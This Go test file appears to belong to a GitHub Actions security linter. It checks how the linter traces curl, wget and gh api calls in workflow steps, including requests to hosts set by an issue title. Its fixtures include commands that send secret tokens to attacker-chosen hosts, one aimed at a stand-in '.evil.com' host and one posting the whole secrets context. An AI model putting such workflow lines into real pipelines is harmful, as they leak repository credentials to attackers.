package taint

import (
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/gh-intel/sisakulint/actions/expr"
	"github.com/gh-intel/sisakulint/actions/workflow"
	cst "github.com/gh-intel/sisakulint/yaml/cst/v1"
)

// requests are the RequestSites of the runs of src, as lines: command,
// occurrence, host refs, path refs, secrets, enterprise token, destination.
func requests(t *testing.T, src string, action bool) []string {
	t.Helper()
	tr := cst.ParseMode([]byte(src), cst.ModeGitHub)
	var a Analysis
	if action {
		act, _ := workflow.ParseActionMetadata(tr)
		a = Analyze(nil, act)
	} else {
		w, _ := workflow.Parse(tr)
		a = Analyze(w, nil)
	}
	var out []string
	for _, s := range a.Sinks {
		for _, r := range s.Requests {
			paths := func(as []CommandArgument) string {
				var ps []string
				for _, x := range as {
					ps = append(ps, expr.PathString(x.Path))
				}
				return strings.Join(ps, ",")
			}
			var secrets []string
			for _, c := range r.Secrets {
				if c.Whole {
					secrets = append(secrets, "*")
				} else if c.Token {
					secrets = append(secrets, "token")
				} else {
					secrets = append(secrets, c.Name)
				}
			}
			out = append(out, fmt.Sprintf("%s#%d host=[%s] path=[%s] secrets=[%s] enterprise=%v dest=%s",
				r.Command, r.Occurrence, paths(r.HostRefs), paths(r.PathRefs), strings.Join(secrets, ","), r.EnterpriseToken, r.Destination))
		}
	}
	return out
}

// onIssues is a workflow on issues whose one step has env and run.
func onIssues(env, run string) string {
	return "on: issues\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          N: none\n" + env + "        run: |\n          " + strings.ReplaceAll(run, "\n", "\n          ") + "\n"
}

func TestRequestSiteCurl(t *testing.T) {
	got := requests(t, onIssues("          T: ${{ secrets.T }}\n", `curl -H "Authorization: Bearer $T" "https://${{ github.event.issue.title }}/x"`), false)
	want := []string{"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false dest=named github.event.issue.title"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteAfterURL(t *testing.T) {
	got := requests(t, onIssues("          T: ${{ secrets.T }}\n", `curl https://api.example.com/x -H "A: $T"`), false)
	want := []string{"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.example.com"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteGhAPI(t *testing.T) {
	for _, c := range []struct{ env, want string }{
		{"          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          X: ${{ github.event.issue.title }}\n", "gh api#1 host=[github.event.issue.title] path=[] secrets=[] enterprise=false dest=named github.event.issue.title"},
		{"          GH_ENTERPRISE_TOKEN: ${{ secrets.GHE }}\n          X: ${{ github.event.issue.title }}\n", "gh api#1 host=[github.event.issue.title] path=[] secrets=[GHE] enterprise=true dest=named github.event.issue.title"},
	} {
		got := requests(t, onIssues(c.env, `gh api "$X"`), false)
		if want := []string{c.want}; !slices.Equal(got, want) {
			t.Errorf("got %q\nwant %q", got, want)
		}
	}
	// a path of the API: the host is GitHub's
	got := requests(t, onIssues("          X: ${{ github.event.issue.title }}\n", `gh api "repos/o/r/issues/$X"`), false)
	if want := []string{"gh api#1 host=[] path=[github.event.issue.title] secrets=[] enterprise=false dest=github"}; !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteSecretHost(t *testing.T) {
	got := requests(t, onIssues("", `curl -d x "${{ secrets.SLACK_WEBHOOK }}"`), false)
	want := []string{"curl#1 host=[] path=[] secrets=[] enterprise=false dest=named secrets.SLACK_WEBHOOK"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteSecretPath(t *testing.T) {
	got := requests(t, onIssues("", `curl -d x "https://hooks.slack.com/services/${{ secrets.P }}"`), false)
	want := []string{"curl#1 host=[] path=[] secrets=[P] enterprise=false dest=literal hooks.slack.com"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSitePathOnly(t *testing.T) {
	got := requests(t, onIssues("", `curl "https://api.example.com/${{ github.event.issue.title }}"`), false)
	want := []string{"curl#1 host=[] path=[github.event.issue.title] secrets=[] enterprise=false dest=literal api.example.com"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteOccurrence(t *testing.T) {
	got := requests(t, onIssues("", "curl https://a.example/\nwget https://b.example/\ncurl https://c.example/"), false)
	want := []string{
		"curl#1 host=[] path=[] secrets=[] enterprise=false dest=literal a.example",
		"wget#1 host=[] path=[] secrets=[] enterprise=false dest=literal b.example",
		"curl#2 host=[] path=[] secrets=[] enterprise=false dest=literal c.example",
	}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteJoined(t *testing.T) {
	got := requests(t, onIssues("          T: ${{ secrets.T }}\n", `curl "--url=https://${{ github.event.issue.title }}/" "-HAuthorization: $T"`), false)
	want := []string{"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false dest=named github.event.issue.title"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

func TestRequestSiteComposite(t *testing.T) {
	src := "runs:\n  using: composite\n  steps:\n    - shell: bash\n      env:\n        T: ${{ inputs.token }}\n      run: |\n        curl -H \"A: $T\" https://api.example.com/\n"
	got := requests(t, src, true)
	if want := []string{"curl#1 host=[] path=[] secrets=[] enterprise=false dest=literal api.example.com"}; !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}

// checkRequests runs requests on a workflow on issues of env and run.
func checkRequests(t *testing.T, env, run string, want ...string) {
	t.Helper()
	got := requests(t, onIssues(env, run), false)
	if !slices.Equal(got, want) {
		t.Errorf("run %q\ngot  %q\nwant %q", run, got, want)
	}
}

const (
	title  = "${{ github.event.issue.title }}"
	envT   = "          T: ${{ secrets.T }}\n"
	envS   = "          S: ${{ secrets.S }}\n"
	titleD = "dest=named github.event.issue.title"
)

// TestRequestSiteEveryDestination: a request goes to every URL of the
// command, with every credential of it.
func TestRequestSiteEveryDestination(t *testing.T) {
	checkRequests(t, envT, `curl -H "A: $T" https://ok.example/ "https://`+title+`/x"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal ok.example",
		"curl#2 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false "+titleD)
	checkRequests(t, envT, `curl $CURL_OPTS -H "A: $T" "https://`+title+`/x"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=unnamed",
		"curl#2 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false "+titleD)
}

// TestRequestSiteValueOptions: an option whose value is not a destination
// does not take the attacker's URL.
func TestRequestSiteValueOptions(t *testing.T) {
	checkRequests(t, envT, `wget -T 30 --header "A: $T" "https://`+title+`/x"`,
		"wget#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false "+titleD)
	checkRequests(t, envT, `curl --expand-header "Authorization: $T" "https://`+title+`/x"`,
		"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false "+titleD)
	checkRequests(t, envT, `curl -H"$T" "https://api.example.com/"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.example.com")
}

// TestRequestSiteGhHost: gh api sends a path of the API to --hostname,
// wherever it is, or to GH_HOST.
func TestRequestSiteGhHost(t *testing.T) {
	checkRequests(t, "", `gh api /repos/x --hostname "`+title+`"`,
		"gh api#1 host=[github.event.issue.title] path=[] secrets=[] enterprise=false "+titleD)
	checkRequests(t, envS, `gh api repos/x --hostname ghe.corp.example -H "Authorization: token $S"`,
		"gh api#1 host=[] path=[] secrets=[S] enterprise=false dest=literal ghe.corp.example")
	checkRequests(t, envS+"          GH_HOST: "+title+"\n", `gh api repos/x -H "Authorization: token $S"`,
		"gh api#1 host=[github.event.issue.title] path=[] secrets=[S] enterprise=false "+titleD)
	checkRequests(t, envS, `GH_HOST=ghe.corp.example gh api repos/x -H "Authorization: token $S"`,
		"gh api#1 host=[] path=[] secrets=[S] enterprise=false dest=literal ghe.corp.example")
	// a full URL goes where it says
	checkRequests(t, envS, `gh api https://api.example.com/x --hostname ghe.corp.example -H "A: $S"`,
		"gh api#1 host=[] path=[] secrets=[S] enterprise=false dest=literal api.example.com")
}

// TestRequestSiteThroughVariable: where a value is in the URL is read
// through the variables the destination word reads.
func TestRequestSiteThroughVariable(t *testing.T) {
	checkRequests(t, "          U: https://hooks.slack.com/services/${{ secrets.P }}\n", `curl -d x "$U"`,
		"curl#1 host=[] path=[] secrets=[P] enterprise=false dest=literal hooks.slack.com")
	checkRequests(t, "", "URL=\"https://api.example.com/x?key=${{ secrets.K }}\"\ncurl \"$URL\"",
		"curl#1 host=[] path=[] secrets=[K] enterprise=false dest=literal api.example.com")
	checkRequests(t, envT+"          U: https://api.example.com/"+title+"\n", `curl -H "A: $T" "$U"`,
		"curl#1 host=[] path=[github.event.issue.title] secrets=[T] enterprise=false dest=literal api.example.com")
	checkRequests(t, envT+"          U: https://"+title+"/x\n", `curl -H "A: $T" "$U"`,
		"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false "+titleD)
	checkRequests(t, envT+"          U: https://${{ secrets.HOST }}/api\n", `curl -H "A: $T" "$U"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=named secrets.HOST")
	checkRequests(t, "          U: ${{ secrets.HOOK }}\n", `curl -d x "$U"`,
		"curl#1 host=[] path=[] secrets=[] enterprise=false dest=named secrets.HOOK")
}

// TestRequestSiteDoubling: a variable that doubles itself is read once per
// assignment.
func TestRequestSiteDoubling(t *testing.T) {
	run := "X=${{ secrets.T }}\nU=https://a.example/\n" + strings.Repeat("X=\"$X$X\"\nU=\"$U$U\"\n", 40) + `curl -H "A: $X" "$U"`
	checkRequests(t, "", run, "curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal a.example")
}

// TestRequestSiteWholeSecrets: the whole secrets context is carried.
func TestRequestSiteWholeSecrets(t *testing.T) {
	checkRequests(t, "", `curl -d "${{ toJSON(secrets) }}" https://api.example.com/`,
		"curl#1 host=[] path=[] secrets=[*] enterprise=false dest=literal api.example.com")
}

// TestRequestSitePrefixAssignment: an assignment before the command is
// not seen by the words of the command.
func TestRequestSitePrefixAssignment(t *testing.T) {
	checkRequests(t, "", `T=${{ secrets.S }} curl -H "A: $T" https://a.example/`,
		"curl#1 host=[] path=[] secrets=[] enterprise=false dest=literal a.example")
}

// TestRequestSiteIPv6: the host of an IPv6 address keeps its brackets.
func TestRequestSiteIPv6(t *testing.T) {
	checkRequests(t, envT, `curl -H "A: $T" "http://[::1]:8080/"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal [::1]")
}

// TestRequestSiteAuthority: an attacker's value in the userinfo or the
// port can end the authority and write its own host; a secret there is
// carried.
func TestRequestSiteAuthority(t *testing.T) {
	checkRequests(t, envT, `curl -H "A: $T" "https://`+title+`@api.example.com/"`,
		"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false dest=literal api.example.com")
	checkRequests(t, envT, `curl -H "A: $T" "https://`+title+`:8080/a"`,
		"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false "+titleD)
	checkRequests(t, envT, `curl -H "A: $T" "https://api.example.com:`+title+`/a"`,
		"curl#1 host=[github.event.issue.title] path=[] secrets=[T] enterprise=false dest=literal api.example.com")
	checkRequests(t, "", `curl "https://${{ secrets.U }}:${{ secrets.P }}@api.example.com/"`,
		"curl#1 host=[] path=[] secrets=[U,P] enterprise=false dest=literal api.example.com")
}

// TestRequestSiteHostForms: env assigned again, ${{ env.X }}, clustered
// options, --hostname=, and hosts that only look like GitHub's.
func TestRequestSiteHostForms(t *testing.T) {
	// a variable of env the script assigns again before the request
	checkRequests(t, envT+"          X: "+title+"\n", "X=https://api.example.com\ncurl -H \"A: $T\" \"$X/y\"",
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.example.com")
	// ${{ env.X }} in the run is read through env
	checkRequests(t, envT+"          API: https://api.github.com\n", `curl -H "A: $T" "${{ env.API }}/repos/o/r"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.github.com")
	// a value joined to the last of clustered short options
	checkRequests(t, envT, `curl -sH"Authorization: $T" https://a.example/`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal a.example")
	// --hostname= with a variable
	checkRequests(t, envS+"          H: ghe.example.com\n", `gh api --hostname=$H /x -H "A: $S"`,
		"gh api#1 host=[] path=[] secrets=[S] enterprise=false dest=literal ghe.example.com")
	// a host of GitHub's URL followed by more host
	checkRequests(t, envT, `curl -H "A: $T" "${GITHUB_API_URL}.evil.com/x"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=unnamed")
	checkRequests(t, envT, `curl -H "A: $T" "${{ github.api_url }}.evil.com/x"`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=unnamed")
	// a trailing dot of the host
	checkRequests(t, envT, `curl -H "A: $T" https://api.github.com./x`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.github.com")
	// --url-query carries its value to the destination
	checkRequests(t, envT, `curl --url-query "key=$T" https://a.example/`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal a.example")
	// an empty word is no destination
	checkRequests(t, envT, `curl -H "A: $T" "" https://a.example/`,
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal a.example")
}

func TestRequestSiteEveryReachingValue(t *testing.T) {
	run := "if [ \"$X\" = 1 ]; then URL=https://api.github.com; else URL=https://hooks.example.com; fi\ncurl -d \"$T\" \"$URL\""
	got := requests(t, onIssues("          T: ${{ secrets.T }}\n", run), false)
	want := []string{
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal hooks.example.com",
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.github.com",
	}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
	run = "if [ \"$X\" = 1 ]; then URL=https://api.github.com; else URL=https://api.github.com/; fi\ncurl -d \"$T\" \"$URL\"\ncurl https://c.example/"
	got = requests(t, onIssues("          T: ${{ secrets.T }}\n", run), false)
	want = []string{
		"curl#1 host=[] path=[] secrets=[T] enterprise=false dest=literal api.github.com",
		"curl#2 host=[] path=[] secrets=[] enterprise=false dest=literal c.example",
	}
	if !slices.Equal(got, want) {
		t.Errorf("got %q\nwant %q", got, want)
	}
}
